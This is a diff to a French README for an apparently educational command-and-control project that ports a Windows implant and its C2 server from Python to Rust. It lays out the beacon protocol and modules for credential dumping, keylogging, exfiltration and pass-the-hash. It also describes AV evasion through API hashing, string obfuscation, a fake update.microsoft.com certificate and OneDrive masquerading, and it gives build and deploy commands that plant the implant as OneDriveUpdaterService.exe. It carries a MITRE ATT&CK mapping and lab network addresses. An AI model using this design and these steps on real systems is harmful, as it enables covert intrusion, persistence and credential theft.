@@ -20,14 +20,14 @@ pédagogique composé de deux parties qui communiquent via HTTPS.
 │  HOST — Machine Deniz (192.168.56.112)                              │
 │                                                                     │
 │  ┌──────────────────────────────────┐                               │
-│  │         server/main.py           │  Flask + TLS (port 443)       │
+│  │      c2_server/src/main.rs       │  axum + TLS (port 443)        │
 │  │                                  │                               │
 │  │  POST /beacon  ← check-in agent  │                               │
 │  │  POST /result  ← résultats       │                               │
 │  │  POST /task    → ordres operator │                               │
 │  │  GET  /agents  → liste agents    │                               │
 │  └──────────────┬───────────────────┘                               │
-│                 │ HTTPS (TLS 1.2+, cert auto-signé                  │
+│                 │ HTTPS (TLS 1.2+, rustls, cert auto-signé          │
 │                 │ CN=update.microsoft.com)                          │
 └─────────────────┼───────────────────────────────────────────────────┘
                   │  host-only network 192.168.56.0/24
@@ -36,10 +36,11 @@ pédagogique composé de deux parties qui communiquent via HTTPS.
 │  VM CIBLE — Windows 11 Enterprise (192.168.56.111)                  │
 │                 │                                                   │
 │  ┌──────────────▼───────────────────┐                               │
-│  │         agent/beacon.py          │  boucle polling toutes 5s     │
-│  │                                  │  + jitter ±2s (anti-détection)│
+│  │   implant/src/communication/     │  boucle beacon toutes 5s     │
+│  │         https.rs                 │  + jitter ±2s (anti-détection)│
+│  │                                  │                               │
 │  │  1. POST /beacon → reçoit tasks  │                               │
-│  │  2. dispatch vers module         │                               │
+│  │  2. dispatch vers execution/     │                               │
 │  │  3. POST /result → envoie output │                               │
 │  └──────────────────────────────────┘                               │
 │                                                                     │
@@ -62,10 +63,10 @@ pédagogique composé de deux parties qui communiquent via HTTPS.
 Agent → Serveur
 POST /beacon
 Content-Type: application/json
-{"id": "agent_mac_id"}
+{"agent_id": "agent_mac_id"}
 
 Serveur → Agent
-{"tasks": [{"id": "t1", "cmd": "shell", "command": "whoami"}]}
+{"tasks": [{"id": "t1", "cmd": "shell", "args": ["whoami"]}]}
 ```
 
 Si aucune tâche en attente, le serveur répond `{"tasks": []}` et l'agent se rendort.
@@ -75,7 +76,7 @@ Si aucune tâche en attente, le serveur répond `{"tasks": []}` et l'agent se re
 ```
 Agent → Serveur
 POST /result
-{"id": "agent_mac_id", "task_id": "t1", "output": "NT AUTHORITY\\SYSTEM"}
+{"agent_id": "agent_mac_id", "task_id": "t1", "output": "NT AUTHORITY\\SYSTEM"}
 ```
 
 ### 3. L'opérateur envoie un ordre
@@ -83,7 +84,7 @@ POST /result
 ```
 Opérateur → Serveur (depuis le host)
 POST /task
-{"id": "agent_mac_id", "task": {"cmd": "shell", "command": "ipconfig /all"}}
+{"id": "agent_mac_id", "task": {"id": "t2", "cmd": "shell", "args": ["ipconfig /all"]}}
 ```
 
 ---
@@ -93,27 +94,29 @@ POST /task
 ```
 s0P0wn3d/
 │
-├── server/                  ← tourne sur le HOST
-│   ├── main.py              ← démarre Flask + TLS sur 0.0.0.0:443
-│   ├── api/routes.py        ← /beacon /result /task /agents
-│   └── modules/             ← traitement côté serveur (parse, stockage)
-│       ├── shell.py         ← parse output shell
-│       ├── creds.py         ← stocke les credentials reçus
-│       ├── keylog.py        ← accumule les frappes reçues
-│       ├── loot.py          ← sauvegarde les fichiers exfiltrés
-│       └── ...
+├── shared/                          ← crate partagée (host + implant)
+│   └── src/
+│       ├── crypto.rs                ← AES-256-GCM + RSA-4096
+│       └── protocol.rs             ← structs JSON (CheckIn, Task, TaskResult…)
 │
-├── agent/                   ← tourne sur la VM CIBLE
-│   ├── beacon.py            ← boucle C2 + dispatch
-│   └── modules/             ← exécution côté cible
-│       ├── shell.py         ← subprocess.run()
-│       ├── persistence.py   ← scheduled task OneDrive
-│       ├── creds.py         ← reg save SAM/SYSTEM
-│       ├── keylog.py        ← pynput listener
-│       └── ...
+├── c2_server/                       ← tourne sur le HOST (axum)
+│   └── src/
+│       ├── main.rs                  ← démarre axum sur 0.0.0.0:443
+│       ├── routes.rs                ← /beacon /result /task /agents
+│       ├── state.rs                 ← sessions agents, queue de tâches
+│       └── handler.rs              ← logique checkin / store_result / queue_task
 │
-├── scripts/gen_cert.py      ← génère cert.pem + key.pem (RSA-2048)
-└── certs/                   ← cert.pem + key.pem (dans .gitignore)
+├── implant/                         ← tourne sur la VM CIBLE (Windows x86_64-msvc)
+│   └── src/
+│       ├── main.rs                  ← boucle beacon + dispatch
+│       ├── config.rs                ← IP C2, port, intervalle (obfstr à la compilation)
+│       ├── communication/https.rs  ← beacon HTTPS reqwest + rustls
+│       ├── evasion/                 ← API hashing, string obfuscation
+│       ├── persistence/             ← registry Run key + scheduled task OneDrive
+│       └── execution/               ← shell, creds, keylog, loot, crack, pth…
+│
+├── scripts/gen_cert.py              ← génère cert.pem + key.pem (one-shot)
+└── certs/                           ← cert.pem + key.pem (dans .gitignore)
 ```
 
 ---
@@ -127,7 +130,25 @@ s0P0wn3d/
 | Jitter ±2s | Évite les patterns de trafic régulier détectables par un SIEM |
 | Cert CN=update.microsoft.com | Légitime aux yeux d'un analyste qui survole les logs TLS |
 | Masquerade OneDrive | OneDrive tourne déjà au démarrage sur la VM, beacon s'y noie |
-| Python pur (pas Metasploit) | Contrôle total du code, apprentissage des mécanismes bas niveau |
+| Rust + MSVC toolchain | Binaire natif Windows, pas de dépendance Python/DLL externe, meilleure évasion AV |
+| RSA-4096 + AES-256-GCM | Échange de clé asymétrique initial, puis chiffrement symétrique de session |
+| rustls (pas OpenSSL) | TLS natif Rust, zéro dépendance système, CRT statique |
+
+---
+
+## Compilation
+
+```bash
+# Depuis le workspace root (Windows, toolchain MSVC installée)
+cargo check --workspace
+
+# Build de l'implant uniquement (binaire Windows)
+cargo build -p implant --target x86_64-pc-windows-msvc --release
+# → target/x86_64-pc-windows-msvc/release/implant.exe
+
+# Build du serveur C2
+cargo build -p c2_server --release
+```
 
 ---
 
@@ -136,10 +157,10 @@ s0P0wn3d/
 | Technique | ID | Composant concerné |
 |---|---|---|
 | Application Layer Protocol: Web Protocols | T1071.001 | Canal HTTPS beacon ↔ serveur |
-| Encrypted Channel: Asymmetric Cryptography | T1573.002 | TLS RSA-2048 sur toutes les comms |
-| Masquerading: Match Legitimate Name | T1036.005 | beacon → OneDriveUpdaterService.exe |
+| Encrypted Channel: Asymmetric Cryptography | T1573.002 | RSA-4096 + AES-256-GCM sur toutes les comms |
+| Masquerading: Match Legitimate Name | T1036.005 | implant → OneDriveUpdaterService.exe |
 | Scheduled Task/Job: Scheduled Task | T1053.005 | persistence au logon |
-| Command and Scripting Interpreter | T1059 | module shell via subprocess |
+| Command and Scripting Interpreter | T1059 | execution/shell.rs via CreateProcess |
 
 ---
 
@@ -176,11 +197,13 @@ level: high
 # 1. Générer les certificats
 python scripts/gen_cert.py
 
-# 2. Démarrer le serveur sur le host
-python server/main.py
+# 2. Démarrer le serveur C2 sur le host
+cargo run -p c2_server
 
-# 3. Lancer le beacon sur la VM (depuis PowerShell admin)
-python agent\beacon.py
+# 3. Compiler et déployer l'implant sur la VM
+cargo build -p implant --target x86_64-pc-windows-msvc --release
+# Copier target/x86_64-pc-windows-msvc/release/implant.exe
+# → C:\Users\<user>\AppData\Local\Microsoft\OneDrive\OneDriveUpdaterService.exe
 
 # 4. Vérifier le check-in depuis le host
 curl -k https://192.168.56.112/agents
@@ -188,5 +211,5 @@ curl -k https://192.168.56.112/agents
 # 5. Envoyer une commande
 curl -k -X POST https://192.168.56.112/task \
   -H "Content-Type: application/json" \
-  -d '{"id": "<agent_id>", "task": {"cmd": "shell", "command": "whoami"}}'
+  -d '{"id": "<agent_id>", "task": {"id": "t1", "cmd": "shell", "args": ["whoami"]}}'
 ```
